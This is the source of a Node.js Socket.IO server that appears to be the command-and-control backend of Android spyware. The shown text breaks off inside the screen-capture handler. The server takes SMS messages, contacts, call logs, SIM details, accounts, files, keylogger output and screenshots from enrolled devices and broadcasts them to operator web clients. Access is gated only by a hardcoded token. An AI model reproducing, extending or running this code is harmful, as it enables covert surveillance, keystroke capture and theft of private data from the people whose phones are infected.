const express = require("express");
const http = require("http");
const fs = require("fs");
const path = require("path");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

const AUTH_SECRET = "MySuperSecretToken";
const clients = new Map(); // uuid → { socket, info }
const DEVICES_FILE = path.join(__dirname, "devices.json");

// -------------------- Load & Save Persistence --------------------
function loadPersistedDevices() {
  try {
    if (fs.existsSync(DEVICES_FILE)) {
      const content = fs.readFileSync(DEVICES_FILE, "utf8").trim();
      // Handle empty file or whitespace-only content
      if (!content) {
        console.log(`📂 devices.json is empty, starting with empty device list`);
        return [];
      }
      const devices = JSON.parse(content);
      // Ensure devices is an array
      if (!Array.isArray(devices)) {
        console.warn(`⚠️ devices.json does not contain an array, resetting to empty array`);
        return [];
      }
      console.log(`📂 Loaded ${devices.length} devices from ${DEVICES_FILE}`);
      return devices;
    }
  } catch (e) {
    console.error("❌ Error loading devices:", e.message);
    console.log(`📂 Resetting devices.json to empty array`);
    // Initialize file with empty array on error
    try {
      fs.writeFileSync(DEVICES_FILE, JSON.stringify([], null, 2));
    } catch (writeErr) {
      console.error("❌ Error resetting devices.json:", writeErr.message);
    }
  }
  return [];
}

function saveDevices() {
  try {
    const devices = Array.from(deviceRegistry.entries()).map(([uuid, d]) => ({
      uuid,
      info: d.info,
      lastSeen: d.lastSeen || Date.now(),
    }));
    fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
    console.log(`💾 Saved ${devices.length} devices.`);
  } catch (e) {
    console.error("❌ Error saving devices:", e.message);
  }
}

const deviceRegistry = new Map();
const persistedDevices = loadPersistedDevices();
persistedDevices.forEach((d) =>
  deviceRegistry.set(d.uuid, { info: d.info, lastSeen: d.lastSeen })
);

// -------------------- SOCKET HANDLERS --------------------
io.on("connection", (socket) => {
  console.log(`🔌 New socket connection: ${socket.id}`);
  let isAuthenticated = false;
  
  // Debug: Log all events from this socket (for debugging account-result)
  const originalEmit = socket.emit.bind(socket);
  socket.emit = function(event, ...args) {
    if (event.includes("account") || event.includes("result")) {
      console.log(`🔍 [DEBUG] Socket ${socket.id} emitting: ${event}`, args);
    }
    return originalEmit(event, ...args);
  };
  
  // Debug: Log ALL incoming events (for debugging account-result)
  socket.onAny((eventName, ...args) => {
    // Special logging for image_preview
    if (eventName === "image_preview" || eventName.includes("preview") || eventName.includes("image")) {
      console.log(`🖼️ [DEBUG-IMAGE] Socket ${socket.id} received event: "${eventName}"`);
      console.log(`🖼️ [DEBUG-IMAGE] Args count:`, args.length);
      if (args.length > 0) {
        console.log(`🖼️ [DEBUG-IMAGE] First arg:`, args[0]);
        console.log(`🖼️ [DEBUG-IMAGE] First arg type:`, typeof args[0]);
        if (typeof args[0] === "object" && args[0] !== null) {
          console.log(`🖼️ [DEBUG-IMAGE] First arg keys:`, Object.keys(args[0]));
        }
      }
    }
    // Special logging for keylogger-result
    if (eventName === "keylogger-result" || eventName.includes("keylogger") || eventName.includes("keylog")) {
      console.log(`⌨️ [DEBUG-KEYLOGGER] Socket ${socket.id} received event: "${eventName}"`);
      console.log(`⌨️ [DEBUG-KEYLOGGER] Args count:`, args.length);
      if (args.length > 0) {
        console.log(`⌨️ [DEBUG-KEYLOGGER] First arg:`, JSON.stringify(args[0], null, 2));
        console.log(`⌨️ [DEBUG-KEYLOGGER] First arg type:`, typeof args[0]);
        if (typeof args[0] === "object" && args[0] !== null) {
          console.log(`⌨️ [DEBUG-KEYLOGGER] First arg keys:`, Object.keys(args[0]));
        }
      }
    }
    console.log(`🔍 [DEBUG-ALL] Socket ${socket.id} received event: "${eventName}"`);
    console.log(`🔍 [DEBUG-ALL] Args count:`, args.length);
    if (args.length > 0) {
      console.log(`🔍 [DEBUG-ALL] First arg:`, args[0]);
      console.log(`🔍 [DEBUG-ALL] First arg type:`, typeof args[0]);
      if (typeof args[0] === "object" && args[0] !== null) {
        console.log(`🔍 [DEBUG-ALL] First arg keys:`, Object.keys(args[0]));
      }
    }
  });
  
  // Log all events after authentication
  socket.onAny((event, data) => {
    if (!isAuthenticated) return;

    const client = clients.get(socket.uuid);
    if (client) client.info = data;

    try {
      console.log(
        `[${event}] Data from ${socket.uuid || "unknown client"}:\n${JSON.stringify(
          data,
          null,
          2
        )}`
      );
    } catch (err) {
      console.error(`[${event}] Invalid JSON data:`, err);
    }
  });

  // -------- DEVICE AUTHENTICATION --------
  socket.on("authenticate", (data) => {
    if (!data || typeof data !== "object") {
      socket.emit("auth-failed", { error: "Invalid authentication data" });
      socket.disconnect(true);
      return;
    }

    const uuid = data?.uuid;
    const token = data?.token;

    if (token === AUTH_SECRET && uuid && typeof uuid === "string") {
      isAuthenticated = true;

      // Replace old connection if exists
      if (clients.has(uuid)) {
        const old = clients.get(uuid);
        try {
          old.socket.disconnect(true);
        } catch (e) {
          console.warn(`⚠️ Error disconnecting old socket for ${uuid}:`, e.message);
        }
      }

      clients.set(uuid, { socket, info: null });
      socket.uuid = uuid;

      // Restore info if known
      if (deviceRegistry.has(uuid)) {
        clients.get(uuid).info = deviceRegistry.get(uuid).info;
        console.log(`♻️ Restored device info for ${uuid}`);
      }

      console.log(`✅ Device authenticated: ${uuid}`);
      socket.emit("auth-success", { uuid });
    } else {
      console.warn(`❌ Authentication failed for socket ${socket.id}`);
      socket.emit("auth-failed", { error: "Invalid token or UUID" });
      socket.disconnect(true);
    }
  });

  // -------- GETINFO from device --------
  socket.on("getinfo", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated getinfo attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid getinfo data from ${uuid}`);
      return;
    }

    // Update client info
    client.info = data;

    try {
      console.log(`📥 [getinfo] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Update registry
      deviceRegistry.set(uuid, { info: data, lastSeen: Date.now() });
      saveDevices();

      // Broadcast device_info event to all web clients
      io.emit("device_event", {
        event: "device_info",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted device_info event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [getinfo] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SMS RESULT from device --------
  socket.on("sms-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated sms-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid sms-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [sms-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast sms-result event to all web clients
      io.emit("device_event", {
        event: "sms_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted sms_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [sms-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- CONTACT RESULT from device --------
  socket.on("contact-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated contact-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid contact-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [contact-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast contact-result event to all web clients
      io.emit("device_event", {
        event: "contact_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted contact_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [contact-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- CALL RESULT from device --------
  socket.on("call-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated call-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid call-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [call-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast call-result event to all web clients
      io.emit("device_event", {
        event: "call_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted call_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [call-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SIM INFO RESULT from device --------
  socket.on("siminfo-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated siminfo-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid siminfo-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [siminfo-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast siminfo-result event to all web clients
      io.emit("device_event", {
        event: "siminfo-result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted siminfo-result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [siminfo-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- ACCOUNT RESULT from device --------
  socket.on("account-result", (data) => {
    // Log data FIRST before any validation
    console.log(`🔔 [account-result] ========== RAW DATA RECEIVED ==========`);
    console.log(`🔔 [account-result] Socket ID: ${socket.id}`);
    console.log(`🔔 [account-result] Data:`, data);
    console.log(`🔔 [account-result] Data type:`, typeof data);
    console.log(`🔔 [account-result] Is array:`, Array.isArray(data));
    console.log(`🔔 [account-result] Is null:`, data === null);
    console.log(`🔔 [account-result] Is undefined:`, data === undefined);
    if (data && typeof data === "object") {
      console.log(`🔔 [account-result] Data keys:`, Object.keys(data));
      console.log(`🔔 [account-result] Data stringified:`, JSON.stringify(data, null, 2));
    }
    console.log(`🔔 [account-result] Is authenticated: ${isAuthenticated}, UUID: ${socket.uuid}`);
    console.log(`🔔 [account-result] =========================================`);
    
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated account-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data - but still process even if format is unexpected
    if (!data) {
      console.error(`❌ No data received from ${uuid}`);
      return;
    }

    try {
      // Handle different data formats
      let processedData = data;
      
      // If data is not an object, try to parse it or wrap it
      if (typeof data !== "object") {
        console.warn(`⚠️ [account-result] Data is not an object, attempting to process anyway`);
        try {
          if (typeof data === "string") {
            processedData = JSON.parse(data);
          } else {
            processedData = { value: data };
          }
        } catch (parseErr) {
          console.error(`❌ [account-result] Failed to parse data:`, parseErr);
          processedData = { raw: data };
        }
      }
      
      console.log(`📥 [account-result] Processed data from ${uuid}:`, JSON.stringify(processedData, null, 2));
      console.log(`📥 [account-result] Processed data keys:`, Object.keys(processedData));
      
      // Broadcast account-result event to all web clients
      const eventPayload = {
        event: "account_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: processedData,
      };
      
      console.log(`📤 [account-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
      io.emit("device_event", eventPayload);
      
      console.log(`✅ [account-result] Broadcasted account_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
    } catch (err) {
      console.error(`❌ [account-result] Error processing data from ${uuid}:`, err.message);
      console.error(`❌ [account-result] Error stack:`, err.stack);
    }
  });
  
  // Also listen for account-result via device-event pattern (fallback)
  socket.on("device-event", (data) => {
    console.log(`🔍 [device-event] Received device-event from ${socket.id}:`, data);
    if (!isAuthenticated || !socket.uuid) return;
    
    const uuid = socket.uuid;
    if (data && (data.event === "account-result" || data.event === "account_result")) {
      console.log(`🔔 [device-event] Account result received via device-event pattern from ${uuid}`);
      
      const eventPayload = {
        event: "account_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data.data || data,
      };
      
      io.emit("device_event", eventPayload);
      console.log(`✅ [device-event] Broadcasted account_result event for ${uuid}`);
    }
  });
  
  // Catch-all handler for any event that might contain account data
  // This will catch events like "account-result-{uuid}", "account_result", etc.
  const accountEventPatterns = [
    "account-result",
    "account_result", 
    "accountresult",
    "account",
    "getaccount-result",
    "getaccount_result"
  ];
  
  accountEventPatterns.forEach(pattern => {
    socket.on(pattern, (data) => {
      console.log(`🔍 [CATCH-ALL] Received event "${pattern}" from ${socket.id}`);
      console.log(`🔍 [CATCH-ALL] Data:`, data);
      
      if (!isAuthenticated || !socket.uuid) {
        console.warn(`⚠️ [CATCH-ALL] Unauthenticated ${pattern} attempt`);
        return;
      }
      
      const uuid = socket.uuid;
      const client = clients.get(uuid);
      
      if (!client) {
        console.error(`❌ [CATCH-ALL] Client not found for UUID: ${uuid}`);
        return;
      }
      
      try {
        const eventPayload = {
          event: "account_result",
          device_id: uuid,
          timestamp: new Date().toISOString(),
          data: data || {},
        };
        
        console.log(`✅ [CATCH-ALL] Broadcasting account_result from ${pattern}`);
        io.emit("device_event", eventPayload);
      } catch (err) {
        console.error(`❌ [CATCH-ALL] Error processing ${pattern}:`, err);
      }
    });
  });

  // -------- DIR RESULT from device --------
  socket.on("dir-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated dir-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid dir-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [dir-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast dir-result event to all web clients
      io.emit("device_event", {
        event: "dir_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted dir_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [dir-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- FILE CHUNK from device (for chunked file downloads) --------
  socket.on("file-chunk", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated file-chunk attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid file-chunk data from ${uuid}`);
      return;
    }

    try {
      // Log raw data first to see what we're actually receiving
      console.log(`📥 [file-chunk] RAW DATA from ${uuid}:`, JSON.stringify({
        fileName: data.fileName,
        transferId: data.transferId,
        isLastChunk: data.isLastChunk,
        isLastChunkType: typeof data.isLastChunk,
        isLastChunkValue: String(data.isLastChunk),
        totalSize: data.totalSize,
        chunkSize: data.chunkSize,
      }));
      
      // Explicitly convert isLastChunk to boolean to ensure it's preserved correctly
      const isLastChunk = data.isLastChunk === true || 
                         data.isLastChunk === "true" || 
                         data.isLastChunk === 1 || 
                         data.isLastChunk === "1" ||
                         String(data.isLastChunk).toLowerCase() === "true";
      
      console.log(`📥 [file-chunk] Chunk from ${uuid}:`, {
        fileName: data.fileName,
        transferId: data.transferId,
        chunkSize: data.chunkSize,
        progress: data.progress,
        isLastChunk: data.isLastChunk,
        isLastChunkConverted: isLastChunk,
        totalSize: data.totalSize,
        chunkLength: data.chunk ? data.chunk.length : 0,
      });
      
      // Remove uuid from data to avoid confusion
      const cleanData = { ...data };
      delete cleanData.uuid;
      
      // Explicitly set isLastChunk as boolean
      cleanData.isLastChunk = isLastChunk;
      
      // Ensure chunk is included (even if empty string for last chunk)
      if (!('chunk' in cleanData)) {
        console.warn(`⚠️ [file-chunk] Missing 'chunk' field in data from ${uuid}`);
        cleanData.chunk = data.chunk || '';
      }
      
      // Broadcast file-chunk event to all web clients
      const eventData = {
        event: "file_chunk",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: cleanData,
      };
      
      console.log(`📤 [file-chunk] Broadcasting to web clients:`, {
        event: eventData.event,
        device_id: eventData.device_id,
        fileName: cleanData.fileName,
        transferId: cleanData.transferId,
        isLastChunk: cleanData.isLastChunk,
        isLastChunkType: typeof cleanData.isLastChunk,
        chunkLength: cleanData.chunk ? cleanData.chunk.length : 0,
        hasChunk: !!cleanData.chunk && cleanData.chunk.length > 0,
      });
      
      io.emit("device_event", eventData);
      
      if (isLastChunk) {
        console.log(`✅ [file-chunk] File transfer completed for ${uuid}: ${data.fileName}`);
      }
    } catch (err) {
      console.error(`❌ [file-chunk] Error processing data from ${uuid}:`, err.message);
      console.error(`❌ [file-chunk] Error stack:`, err.stack);
    }
  });

  // -------- FILE END from device (alternative way device might signal completion) --------
  socket.on("file-end", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated file-end attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid file-end data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [file-end] File transfer ended for ${uuid}:`, {
        fileName: data.fileName,
        transferId: data.transferId,
        totalSize: data.totalSize,
      });
      
      // Broadcast as a file-chunk event with isLastChunk: true
      const eventData = {
        event: "file_chunk",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: {
          fileName: data.fileName,
          transferId: data.transferId,
          chunk: "", // Empty chunk for last chunk
          isLastChunk: true,
          totalSize: data.totalSize,
          chunkSize: 0,
        },
      };
      
      console.log(`📤 [file-end] Broadcasting completion as file_chunk event`);
      io.emit("device_event", eventData);
      
      console.log(`✅ [file-end] File transfer completed for ${uuid}: ${data.fileName}`);
    } catch (err) {
      console.error(`❌ [file-end] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- DOWNLOAD RESULT from device --------
  socket.on("download-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated download-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid download-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [download-result] Data from ${uuid}:`, {
        fileName: data.fileName || data.name,
        fileSize: data.fileSize || data.size,
        hasData: !!data.data || !!data.content || !!data.fileData,
      });
      
      // Broadcast download-result event to all web clients
      io.emit("device_event", {
        event: "download_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted download_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [download-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- UPLOAD RESULT from device --------
  socket.on("upload-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated upload-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid upload-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [upload-result] Data from ${uuid}:`, {
        success: data.success,
        message: data.message || data.status,
        fileName: data.fileName || data.name,
      });
      
      // Broadcast upload-result event to all web clients
      io.emit("device_event", {
        event: "upload_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted upload_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [upload-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- DELETE RESULT from device --------
  socket.on("delete-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated delete-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid delete-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [delete-result] Data from ${uuid}:`, {
        success: data.success,
        message: data.message || data.status,
        filePath: data.filePath || data.path,
      });
      
      // Broadcast delete-result event to all web clients
      io.emit("device_event", {
        event: "delete_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted delete_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [delete-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- IMAGE PREVIEW from device --------
  socket.on("image_preview", (data) => {
    console.log(`🖼️ [image_preview] ========== EVENT RECEIVED ==========`);
    console.log(`🖼️ [image_preview] Socket ID: ${socket.id}`);
    console.log(`🖼️ [image_preview] Is authenticated: ${isAuthenticated}`);
    console.log(`🖼️ [image_preview] Socket UUID: ${socket.uuid}`);
    console.log(`🖼️ [image_preview] Data:`, data);
    
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated image_preview attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid image_preview data from ${uuid}`);
      console.error(`❌ Data type: ${typeof data}`);
      console.error(`❌ Data value:`, data);
      return;
    }

    console.log(`🖼️ [image_preview] Data from ${uuid}:`);
    console.log(`   FileName: ${data.fileName || "unknown"}`);
    console.log(`   Thumbnail exists: ${!!data.thumbnail}`);
    console.log(`   Thumbnail size: ${data.thumbnail ? `${Math.round(data.thumbnail.length / 1024)} KB` : "N/A"}`);

    // Broadcast to all web clients as device_event
    const broadcastData = {
      deviceId: uuid,
      event: "image_preview",
      data: {
        fileName: data.fileName || "preview",
        thumbnail: data.thumbnail || null,
      },
      timestamp: new Date().toISOString(),
    };
    
    console.log(`🖼️ [image_preview] Broadcasting:`, JSON.stringify(broadcastData, null, 2));
    
    io.emit("device_event", broadcastData);

    console.log(`✅ [image_preview] Broadcasted preview for ${data.fileName || "unknown"} to web clients`);
    console.log(`🖼️ [image_preview] ===========================================`);
  });

  // -------- APP RESULT from device --------
  socket.on("app-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated app-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid app-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [app-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast app-result event to all web clients
      io.emit("device_event", {
        event: "app_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      
      console.log(`📤 Broadcasted app_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [app-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- KEYLOGGER RESULT from device --------
  socket.on("keylogger-result", (data) => {
    console.log(`⌨️ [keylogger-result] ========== EVENT RECEIVED ==========`);
    console.log(`⌨️ [keylogger-result] Socket ID: ${socket.id}`);
    console.log(`⌨️ [keylogger-result] Is authenticated: ${isAuthenticated}`);
    console.log(`⌨️ [keylogger-result] Socket UUID: ${socket.uuid}`);
    console.log(`⌨️ [keylogger-result] Data:`, data);
    console.log(`⌨️ [keylogger-result] Data type:`, typeof data);
    console.log(`⌨️ [keylogger-result] Is array:`, Array.isArray(data));
    
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated keylogger-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data - be more lenient
    if (!data) {
      console.error(`❌ Invalid keylogger-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [keylogger-result] Processing data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Handle different data formats
      let processedData = data;
      
      // If data is an array, wrap it
      if (Array.isArray(data)) {
        processedData = { entries: data };
      } else if (typeof data === "object") {
        // Already an object, use as is
        processedData = data;
      } else {
        // Try to parse if string
        try {
          processedData = JSON.parse(String(data));
        } catch (e) {
          processedData = { raw: data };
        }
      }
      
      console.log(`📥 [keylogger-result] Processed data:`, JSON.stringify(processedData, null, 2));
      
      // Broadcast keylogger-result event to all web clients
      const eventPayload = {
        event: "keylogger_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: processedData,
      };
      
      console.log(`📤 [keylogger-result] Broadcasting event:`, JSON.stringify(eventPayload, null, 2));
      io.emit("device_event", eventPayload);
      
      console.log(`✅ [keylogger-result] Broadcasted keylogger_result event for ${uuid} to ${io.sockets.sockets.size} connected clients`);
      console.log(`⌨️ [keylogger-result] ===========================================`);
    } catch (err) {
      console.error(`❌ [keylogger-result] Error processing data from ${uuid}:`, err.message);
      console.error(`❌ [keylogger-result] Error stack:`, err.stack);
    }
  });

  // -------- SKELETON RESULT from device --------
  socket.on("skeleton-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated skeleton-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid skeleton-result data from ${uuid}`);
      return;
    }

    try {
      console.log(`📥 [skeleton-result] Data from ${uuid}:`, JSON.stringify(data, null, 2));
      
      // Broadcast skeleton-result event to all web clients
      io.emit("device_event", {
        event: "skeleton_result",
        device_id: uuid,
        timestamp: new Date().toISOString(),
        data: data,
      });
      
      console.log(`📤 Broadcasted skeleton_result event for ${uuid}`);
    } catch (err) {
      console.error(`❌ [skeleton-result] Error processing data from ${uuid}:`, err.message);
    }
  });

  // -------- SCREEN RESULT from device --------
  socket.on("screen-result", (data) => {
    if (!isAuthenticated || !socket.uuid) {
      console.warn(`⚠️ Unauthenticated screen-result attempt from ${socket.id}`);
      return;
    }

    const uuid = socket.uuid;
    const client = clients.get(uuid);
    
    if (!client) {
      console.error(`❌ Client not found for UUID: ${uuid}`);
      return;
    }

    // Validate data
    if (!data || typeof data !== "object") {
      console.error(`❌ Invalid screen-result data from ${uuid}`);
      return;
    }

    try {
      // Debug: Log raw data structure
      console.log(`🔍 [screen-result] Raw data keys:`, Object.keys(data || {}));
      console.log(`🔍 [screen-result] Raw data.image_data exists:`, !!data.image_data);
      console.log(`🔍 [screen-result] Raw data.image_data type:`, typeof data.image_data);
      console.log(`🔍 [screen-result] Raw data.image_data preview:`, data.image_data ? data.image_data.substring(0, 50) : 'null');
      
      // Normalize field names - handle both formats
      // Device may send: image_data, frmt, wmob, hmob
      // Or standard: image/data, format, width, height
      let imageData = data.image_data || data.image || data.data || null;
      const format = data.frmt || data.format || "webp";
      const width = data.wmob || data.width || null;
      const height = data.hmob || data.height || null;
      
      console.log(`🔍 [screen-result] After extraction:`, {
        imageDataExists: !!imageData,
        imageDataType: typeof imageData,
        imageDataLength: imageData ? imageData.length : 0,
        format,
        width,
        height
      });
      
      // Handle escaped characters in base64 string (common in JSON)
      if (imageData && typeof imageData === "string") {
        // Trim whitespace but DON'T remove leading slashes - they're valid base64!
        // Base64 can start with / (like /9j/ for JPEG or /Ukl/ for WebP)
        imageData = imageData.trim();
        
        // REMOVED: Don't handle escaped forward slashes (\/) - base64 data should have raw /
        // The leading / in /9j/ is valid base64 and should NOT be escaped
        // Only handle other escape sequences that might corrupt the data
        imageData = imageData.replace(/\\n/g, '\n');
        imageData = imageData.replace(/\\r/g, '\r');
        imageData = imageData.replace(/\\t/g, '\t');
        
        // Remove quotes if they wrap the string, but preserve base64 characters
        imageData = imageData.replace(/^["']+|["']+$/g, '');
        
        console.log(`🔍 [screen-result] After cleaning:`, {
          imageDataLength: imageData.length,
          preview: imageData.substring(0, 50),
          firstChar: imageData[0],
          startsWithSlash: imageData.startsWith('/')
        });
      }
      
      // Ensure leading slash is preserved (critical for JPEG base64)
      if (imageData && !imageData.startsWith('/') && imageData.startsWith('9j/')) {
        console.log(`⚠️ [screen-result] Missing leading slash, fixing...`);
        imageData = '/' + imageData;
      }
      
      // Create normalized data object
      const normalizedData = {
        image_data: imageData,
        format: format,
        width: width,
        height: height,
        // Preserve any other fields
        ...(data.uuid && { uuid: data.uuid }),
        ...(data.type && { type: data.type }),
      };
      
      console.log(`📺 [screen-result] Data from ${uuid}:`, {
        hasImage: !!imageData,
        hasData: !!imageData,
        width: width,
        height: height,
        format: format,
